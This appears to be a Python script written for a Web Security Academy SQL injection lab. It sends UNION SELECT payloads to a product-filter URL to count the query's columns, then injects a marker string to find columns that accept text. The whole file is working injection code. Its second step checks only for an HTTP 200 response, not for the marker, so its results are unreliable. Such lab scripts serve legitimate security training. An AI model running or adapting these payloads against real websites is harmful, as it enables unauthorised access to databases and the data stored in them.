import requests
import json
import urllib


# URL of target

keyword = 'Accessories' # used to match when looking for total columns
URL = "https://0a8700b503e39a59c0a123d1006e0049.web-security-academy.net/filter?category="

# payload = "' union select null--"

# res = requests.get(URL+payload)
# print(res)

found = False;
col_index = 0  # counter for no. of columns

print("1 Detecting no of columns with union attack...")

while(found == False):
	payload = "' union select {}null--".format(col_index*'null,')
	res = requests.get(URL+payload)
	if (keyword in res.text):
		found = True
		break
	else:
		col_index=col_index+1

col_count = col_index+1
print("[+] Found! Total columns detected = {}\n".format(col_count))

print("2 Detecting columns with text")
found = False
# colText = 0 # counter for which column is string type

# Make the database retrieve the string: 'F47hhS'
for index in range(col_count):
	array = ['null'] * col_count
	array[index] = "'F47hhS'"
	stringWithComma = ",".join(array) 
	payload = "'union select {}--".format(stringWithComma)

	res = requests.get(URL+payload)
	if res.status_code == 200:	
		print("[+] Found! column index {} is a string type\n".format(index))
		# colText = index
	
